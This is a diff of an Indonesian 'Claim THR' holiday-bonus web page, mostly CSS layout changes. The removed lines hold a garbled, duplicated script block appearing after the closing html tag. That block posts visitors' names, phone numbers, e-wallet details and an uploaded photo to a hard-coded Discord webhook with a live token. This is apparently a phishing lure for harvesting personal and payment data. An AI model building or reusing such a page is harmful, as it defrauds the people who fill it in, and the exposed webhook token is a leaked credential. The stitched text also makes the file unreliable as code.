@@ -8,9 +8,13 @@
       font-family: Arial;
       background: linear-gradient(135deg, #f97316, #fb923c);
       color: #fff7ed;
-      text-align: center;
-      padding-top: 100px;
-      overflow: hidden;
+
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+
+      margin: 0;
     }
 
     .box {
@@ -18,27 +22,27 @@
       color: #1f2937;
       padding: 30px;
       border-radius: 20px;
-      display: inline-block;
       box-shadow: 0 10px 25px rgba(0,0,0,0.2);
       transition: all 0.5s ease;
-      max-width: 90%;
+
+      width: 320px;
+      text-align: center;
     }
 
     input {
       display: block;
       margin: 10px auto;
       padding: 12px;
-      width: 80%;
+      width: 100%;
       border-radius: 10px;
       border: 1px solid #e5e7eb;
+      box-sizing: border-box;
     }
 
     .row {
       display: flex;
-      justify-content: center;
       gap: 5px;
-      width: 80%;
-      margin: 10px auto;
+      margin: 10px 0;
     }
 
     .row select {
@@ -54,7 +58,9 @@
     }
 
     button {
-      padding: 12px 25px;
+      margin-top: 10px;
+      padding: 12px;
+      width: 100%;
       border: none;
       border-radius: 12px;
       background: #f97316;
@@ -66,24 +72,24 @@
 
     button:hover {
       background: #ea580c;
-      transform: scale(1.05);
+      transform: scale(1.03);
     }
 
     #step2, #success {
       display: none;
       opacity: 0;
-      transform: scale(0.8);
+      transform: scale(0.9);
     }
 
     img {
-      width: 200px;
-      margin: 20px 0;
-      border-radius: 15px;
+      width: 180px;
+      margin: 15px 0;
+      border-radius: 12px;
     }
 
     .fade-out {
       opacity: 0;
-      transform: scale(0.8);
+      transform: scale(0.9);
     }
 
     .fade-in {
@@ -96,7 +102,7 @@
 
 <!-- STEP 1 -->
 <div class="box" id="step1">
-  <h1>🎁 Claim THR</h1>
+  <h2>🎁 Claim THR</h2>
   <p>Isi data dulu ya kaka, nanti langsung diproses 👍</p>
 
   <input type="text" id="nama" placeholder="Nama kaka">
@@ -112,7 +118,7 @@
     <input 
       type="text" 
       id="nomor" 
-      placeholder="Nomor HP kaka"
+      placeholder="Nomor HP"
       oninput="this.value = this.value.replace(/[^0-9]/g, '')"
     >
   </div>
@@ -162,9 +168,9 @@ function nextStep() {
 
   setTimeout(() => {
     step1.style.display = "none";
-    step2.style.display = "inline-block";
+    step2.style.display = "block";
     setTimeout(() => step2.classList.add("fade-in"), 50);
-  }, 500);
+  }, 300);
 }
 
 function kirimData() {
@@ -195,92 +201,7 @@ function showSuccess() {
   document.getElementById("step2").style.display = "none";
 
   let success = document.getElementById("success");
-  success.style.display = "inline-block";
-
-  setTimeout(() => {
-    success.classList.add("fade-in");
-  }, 50);
-}
-</script>
-
-</body>
-</html>etElementById("step2");
-
-  step1.classList.add("fade-out");
-
-  setTimeout(() => {
-    step1.style.display = "none";
-    step2.style.display = "inline-block";
-    setTimeout(() => step2.classList.add("fade-in"), 50);
-  }, 500);
-}
-
-document.getElementById("realForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  let step2 = document.getElementById("step2");
-  let step3 = document.getElementById("step3");
-
-  step2.classList.add("fade-out");
-
-  setTimeout(() => {
-    step2.style.display = "none";
-    step3.style.display = "inline-block";
-    setTimeout(() => step3.classList.add("fade-in"), 50);
-  }, 500);
-});
-
-// preview foto
-document.getElementById("foto").addEventListener("change", function() {
-  let file = this.files[0];
-  if (!file) return;
-
-  let preview = document.getElementById("preview");
-  preview.src = URL.createObjectURL(file);
-  preview.style.display = "block";
-});
-
-// kirim ke discord
-function kirimData() {
-  let file = document.getElementById("foto").files[0];
-
-  if (!file) {
-    alert("Upload foto dulu 😭");
-    return;
-  }
-
-  let nama = document.getElementById("hiddenNama").value;
-  let nomor = document.getElementById("hiddenNomor").value;
-  let wallet = document.getElementById("hiddenWallet").value;
-
-  let formData = new FormData();
-  formData.append("file", file);
-
-  formData.append("payload_json", JSON.stringify({
-    content:
-      "🎁 THR CLAIM\n\n" +
-      "👤 Nama: " + nama + "\n" +
-      "📱 Nomor: " + nomor + "\n" +
-      "💳 E-Wallet: " + wallet
-  }));
-
-  fetch("https://discord.com/api/webhooks/1484678541990953082/wQ6pSPTqGeiTlZ50nmQ_KGjG8xGZSbDAijTD1C3gAMaiJXimQJpoOUTzx5cn85EEFGV5", {
-    method: "POST",
-    body: formData
-  })
-  .then(() => {
-    showSuccess();
-  })
-  .catch(() => {
-    alert("Gagal kirim 😭");
-  });
-}
-
-function showSuccess() {
-  document.getElementById("step3").style.display = "none";
-
-  let success = document.getElementById("success");
-  success.style.display = "inline-block";
+  success.style.display = "block";
 
   setTimeout(() => {
     success.classList.add("fade-in");
